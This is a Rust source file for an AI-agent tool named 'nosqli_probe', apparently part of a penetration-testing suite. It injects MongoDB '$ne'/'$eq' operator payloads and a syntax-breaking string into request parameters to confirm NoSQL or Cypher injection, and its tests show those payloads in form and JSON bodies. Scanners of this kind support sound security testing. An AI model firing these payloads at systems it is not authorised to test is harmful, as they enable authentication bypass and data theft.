//! Port of `src/main/mcp/tools/nosqli_probe.ts` — confirm NoSQL (MongoDB) /
//! Cypher (Neo4j) injection at a request parameter, where `sqli_probe` is blind
//! (Mongo throws no SQL error). Two signals: an operator differential
//! (`param[$ne]=<nonce>` vs `param[$eq]=<nonce>`) and a syntax-breaker that
//! surfaces a driver parse error.

use std::sync::LazyLock;
use std::sync::PoisonError;
use std::time::Duration;

use regex::Regex;
use rever_tools_api::tool::{BoxFuture, Tool, ToolContext, ToolDef};
use rever_tools_api::utils::{ToolResult, err, ok};
use rever_tools_http::{RequestSpec, build_request_spec, restore_marker, send};
use serde_json::{Value, json};

use crate::args::{text, validate};
use crate::common::{encode_uri_component, inject_json, inject_kv, random_nonce};
use crate::{pretty, schema};

const SEND_TIMEOUT: Duration = Duration::from_secs(15);

/// `'op-true' | 'op-false' | 'error'` — kept as `&'static str` contexts.
struct NosqliCase {
    context: &'static str,
    op: Option<&'static str>,
    value: String,
}

/// `buildNosqliCases`: the operator true/false pair plus one syntax breaker.
fn build_nosqli_cases(nonce: &str) -> Vec<NosqliCase> {
    vec![
        NosqliCase { context: "op-true", op: Some("ne"), value: nonce.to_owned() },
        NosqliCase { context: "op-false", op: Some("eq"), value: nonce.to_owned() },
        // A breaker that upsets Mongo `$where`/JSON parsing and Cypher alike.
        NosqliCase { context: "error", op: None, value: format!("{nonce}'\"\\)}}];//") },
    ]
}

/// NoSQL/Cypher driver error signatures that leak into a response body.
static NOSQL_ERROR_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r"(?i)(neo4j|cypher|Neo\.ClientError|Neo\.DatabaseError|mongoerror|mongoservererror|mongoparseerror|bsonerror|casterror|E11000|\$where|unexpected token.*json|invalid regular expression|unterminated)",
    )
    .expect("valid")
});

static WHITESPACE_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"\s+").expect("valid"));

struct NosqliReply {
    context: &'static str,
    status: u16,
    body: String,
    nonce: String,
}

#[derive(Debug, PartialEq, Eq)]
struct NosqliOutcome {
    nosqli: bool,
    contexts: Vec<String>,
}

/// Strip every nonce echo, collapse whitespace, prefix the status — so a page
/// that merely reflects the nonce doesn't register as a differential.
fn normalize_body(r: &NosqliReply) -> String {
    let stripped = r.body.replace(&r.nonce, "");
    let collapsed = WHITESPACE_RE.replace_all(&stripped, " ");
    format!("{}|{}", r.status, collapsed)
}

/// Confirmed iff a NoSQL error signature appears, or the operator pair differs.
fn nosqli_evaluated(replies: &[NosqliReply]) -> NosqliOutcome {
    let by_ctx = |ctx: &str| replies.iter().find(|r| r.context == ctx);
    let mut contexts: Vec<String> = Vec::new();
    if let Some(e) = by_ctx("error")
        && NOSQL_ERROR_RE.is_match(&e.body)
    {
        contexts.push("error".to_owned());
    }
    if let (Some(t), Some(f)) = (by_ctx("op-true"), by_ctx("op-false"))
        && normalize_body(t) != normalize_body(f)
    {
        contexts.push("operator".to_owned());
    }
    NosqliOutcome { nosqli: !contexts.is_empty(), contexts }
}

/// Case-insensitive `content-type` header value, or `""`.
fn content_type(spec: &RequestSpec) -> &str {
    spec.headers
        .iter()
        .find(|(name, _)| name.eq_ignore_ascii_case("content-type"))
        .map_or("", |(_, value)| value.as_str())
}

/// Largest char boundary `<= i` (and `<= len`), so a UTF-8 body is never split.
fn floor_boundary(s: &str, i: usize) -> usize {
    let mut i = i.min(s.len());
    while i > 0 && !s.is_char_boundary(i) {
        i -= 1;
    }
    i
}

/// Preview around the first driver-error match (−30/+60 bytes), else the body
/// head (0..120) — both clamped to char boundaries.
fn preview(body: &str) -> String {
    match NOSQL_ERROR_RE.find(body) {
        Some(m) => {
            let start = floor_boundary(body, m.start().saturating_sub(30));
            let end = floor_boundary(body, m.start() + 60);
            body[start..end].to_owned()
        }
        None => body[..floor_boundary(body, 120)].to_owned(),
    }
}

pub struct NosqliProbe;

impl Tool for NosqliProbe {
    fn def(&self) -> ToolDef {
        ToolDef::new(
            "nosqli_probe",
            "Confirm NoSQL (MongoDB) / Cypher (Neo4j) injection at a request parameter — use this, not sqli_probe, when the backend is Mongo/Neo4j (sqli_probe is SQL-error based and blind to them). Fires an operator differential (`param[$ne]=<nonce>` vs `param[$eq]=<nonce>`: the responses differ only if the param reaches a query as an object — the `$ne` auth/filter-bypass class) plus a syntax-breaker that surfaces a Neo4j/Cypher/Mongo parse error. Pass param=<field name>; the tool rewrites form, JSON, or query carriers itself. Login/search fields on a Mongo/Neo4j app are the classic carriers. A positive is auth-bypass / data-exfiltration class; record as critical.",
            schema(
                json!({
                    "requestId": { "type": "string" },
                    "param": {
                        "type": "string",
                        "description": "Field name that carries the value (e.g. \"username\") — the tool rewrites it for Mongo/Cypher injection"
                    },
                    "nonce": {
                        "type": "string",
                        "description": "Override the random nonce (test determinism)"
                    }
                }),
                &["requestId", "param"],
            ),
        )
    }

    fn call<'a>(&'a self, ctx: &'a ToolContext, args: Value) -> BoxFuture<'a, ToolResult> {
        Box::pin(async move {
            if let Err(refusal) = validate(&self.def(), &args) {
                return refusal;
            }
            let request_id = text(&args, "requestId").unwrap_or_default().to_owned();
            let param = text(&args, "param").unwrap_or_default().to_owned();
            let nonce = text(&args, "nonce")
                .map(str::to_owned)
                .unwrap_or_else(random_nonce);

            // Lock the store only long enough to build the spec; the sends below
            // must not hold it.
            let base = {
                let store = ctx.traffic.lock().unwrap_or_else(PoisonError::into_inner);
                match build_request_spec(&store, Some(&request_id), None) {
                    Ok(spec) => restore_marker(spec),
                    Err(error) => return err(error),
                }
            };

            let in_query = base.url.contains(&format!("{}=", encode_uri_component(&param)))
                || base.url.contains(&format!("{param}="));
            let is_json = content_type(&base)
                .to_ascii_lowercase()
                .contains("application/json");
            if !in_query && base.body.is_none() {
                return err(format!(
                    "no carrier for \"{param}\": the request has no query string and no body to inject into"
                ));
            }

            let cases = build_nosqli_cases(&nonce);
            let mut replies: Vec<NosqliReply> = Vec::with_capacity(cases.len());
            let mut results: Vec<Value> = Vec::with_capacity(cases.len());
            for case in &cases {
                let mut sub = base.clone();
                let kv_replacement = match case.op {
                    Some(op) => format!("{param}[${op}]={}", case.value),
                    None => format!("{param}={}", encode_uri_component(&case.value)),
                };
                if in_query {
                    let (path, qs) = sub
                        .url
                        .split_once('?')
                        .map_or_else(|| (sub.url.clone(), String::new()), |(p, q)| (p.to_owned(), q.to_owned()));
                    sub.url = format!("{path}?{}", inject_kv(&qs, &param, &kv_replacement));
                } else if is_json {
                    let value = match case.op {
                        Some(op) => {
                            let mut map = serde_json::Map::new();
                            map.insert(format!("${op}"), json!(case.value));
                            Value::Object(map)
                        }
                        None => json!(case.value),
                    };
                    match inject_json(sub.body.as_deref().unwrap_or(""), &param, value) {
                        Ok(body) => sub.body = Some(body),
                        Err(error) => return err(error),
                    }
                } else {
                    sub.body =
                        Some(inject_kv(sub.body.as_deref().unwrap_or(""), &param, &kv_replacement));
                }

                let out = send(&sub, SEND_TIMEOUT).await;
                results.push(json!({
                    "context": case.context,
                    "status": out.status,
                    "preview": preview(&out.body),
                }));
                replies.push(NosqliReply {
                    context: case.context,
                    status: out.status,
                    body: out.body,
                    nonce: case.value.clone(),
                });
            }

            let outcome = nosqli_evaluated(&replies);
            let note = if outcome.nosqli {
                "NoSQL/Cypher injection confirmed (operator differential and/or driver error signature) — auth-bypass / data-exfiltration class, record as critical."
            } else {
                "No driver error and no operator differential; the param likely does not reach a Mongo/Neo4j query as an object. (A bcrypt-gated login compares the password outside the query, so a null result here is expected there.)"
            };
            ok(pretty(&json!({
                "nosqli": outcome.nosqli,
                "contexts": outcome.contexts,
                "note": note,
                "results": results,
            })))
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::common::{inject_json, inject_kv};

    fn reply(context: &'static str, nonce: &str, body: &str, status: u16) -> NosqliReply {
        NosqliReply { context, status, body: body.to_owned(), nonce: nonce.to_owned() }
    }

    #[test]
    fn 연산자_true_false_쌍과_에러_브레이커를_만든다() {
        let cases = build_nosqli_cases("zXYZz");
        assert_eq!(
            cases.iter().map(|c| c.context).collect::<Vec<_>>(),
            ["op-true", "op-false", "error"]
        );
        assert_eq!(cases[0].op, Some("ne"));
        assert_eq!(cases[0].value, "zXYZz");
        assert_eq!(cases[1].op, Some("eq"));
        assert_eq!(cases[1].value, "zXYZz");
        assert!(cases[2].value.contains("'\""));
    }

    #[test]
    fn inject_kv는_폼_쿼리의_대상_파라미터를_연산자_절로_바꾼다() {
        assert_eq!(
            inject_kv("username=rtuser&password=x", "username", "username[$ne]=zz"),
            "username[$ne]=zz&password=x"
        );
    }

    #[test]
    fn inject_kv는_기존_연산자_표기도_교체한다() {
        assert_eq!(
            inject_kv("username[$eq]=a&password=x", "username", "username[$ne]=zz"),
            "username[$ne]=zz&password=x"
        );
    }

    #[test]
    fn inject_kv는_없으면_뒤에_덧붙인다() {
        assert_eq!(
            inject_kv("password=x", "username", "username[$ne]=zz"),
            "password=x&username[$ne]=zz"
        );
    }

    #[test]
    fn inject_kv는_접두사가_같은_다른_파라미터는_건드리지_않는다() {
        assert_eq!(inject_kv("user=a&username=b", "user", "user[$ne]=zz"), "user[$ne]=zz&username=b");
    }

    #[test]
    fn inject_json은_대상_키를_연산자_객체로_세팅한다() {
        let out = inject_json("{\"username\":\"a\",\"password\":\"b\"}", "username", json!({"$ne":"zz"}))
            .unwrap();
        assert_eq!(
            serde_json::from_str::<Value>(&out).unwrap(),
            json!({"username":{"$ne":"zz"},"password":"b"})
        );
    }

    #[test]
    fn inject_json은_스칼라_브레이커도_세팅한다() {
        let out = inject_json("{\"username\":\"a\"}", "username", json!("zz'\"//")).unwrap();
        assert_eq!(serde_json::from_str::<Value>(&out).unwrap(), json!({"username":"zz'\"//"}));
    }

    #[test]
    fn nosql_error_re는_mongo_neo4j_드라이버_에러에만_반응한다() {
        assert!(NOSQL_ERROR_RE.is_match("Neo.ClientError.Statement.SyntaxError"));
        assert!(NOSQL_ERROR_RE.is_match("MongoServerError: unknown operator: $where"));
        assert!(NOSQL_ERROR_RE.is_match("Invalid Cypher query near RETURN"));
        assert!(NOSQL_ERROR_RE.is_match("CastError: Cast to ObjectId failed"));
        assert!(!NOSQL_ERROR_RE.is_match("Invalid user or password"));
        assert!(!NOSQL_ERROR_RE.is_match("You have an error in your SQL syntax"));
    }

    #[test]
    fn 에러_응답에_드라이버_시그니처가_있으면_error로_확정한다() {
        let out = nosqli_evaluated(&[
            reply("op-true", "zz", "same", 200),
            reply("op-false", "zz", "same", 200),
            reply("error", "zz'\"", "500 Neo.ClientError.Statement.SyntaxError", 500),
        ]);
        assert_eq!(out, NosqliOutcome { nosqli: true, contexts: vec!["error".to_owned()] });
    }

    #[test]
    fn 연산자_true_false_응답이_차등이면_operator로_확정한다() {
        let out = nosqli_evaluated(&[
            reply("op-true", "zz", "Welcome admin dashboard", 302),
            reply("op-false", "zz", "Invalid user or password", 200),
            reply("error", "zz'\"", "ok", 200),
        ]);
        assert_eq!(out, NosqliOutcome { nosqli: true, contexts: vec!["operator".to_owned()] });
    }

    #[test]
    fn nonce_반사만_다르면_차등이_아니다_오탐_방지() {
        let out = nosqli_evaluated(&[
            reply("op-true", "zz", "you searched for zz", 200),
            reply("op-false", "zz", "you searched for zz", 200),
            reply("error", "zz'\"", "ok", 200),
        ]);
        assert!(!out.nosqli);
    }

    #[test]
    fn bcrypt_로그인처럼_세_응답이_동일하면_음성() {
        let out = nosqli_evaluated(&[
            reply("op-true", "zz", "Invalid user or password", 200),
            reply("op-false", "zz", "Invalid user or password", 200),
            reply("error", "zz'\"", "Invalid user or password", 200),
        ]);
        assert_eq!(out, NosqliOutcome { nosqli: false, contexts: vec![] });
    }
}
